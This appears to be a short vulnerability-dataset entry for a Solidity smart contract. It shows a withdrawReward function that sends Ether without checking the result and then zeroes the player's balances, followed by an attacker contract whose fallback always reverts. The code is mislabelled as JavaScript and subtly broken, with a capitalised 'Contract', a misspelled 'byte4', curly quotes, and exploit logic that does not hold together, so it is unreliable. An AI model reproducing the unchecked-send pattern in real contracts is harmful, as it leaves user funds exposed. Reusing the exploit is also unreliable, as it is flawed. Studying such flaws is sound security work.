## Vulnerable Code

```javascript
function withdrawReward() public
    {
        updateShareETH(msg.sender);
        PlayerData storage p = players[msg.sender];
        
        uint256 reward = SafeMath.add(p.share, p.win);
        msg.sender.send(reward);  //Vulnerable position 
        // update player
        p.win = 0;
        p.share = 0;
    }
```



## Exploit Code

```javascript
Contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“withdrawReward()”)));
    }

    function(){
        revert();
    }
}
```
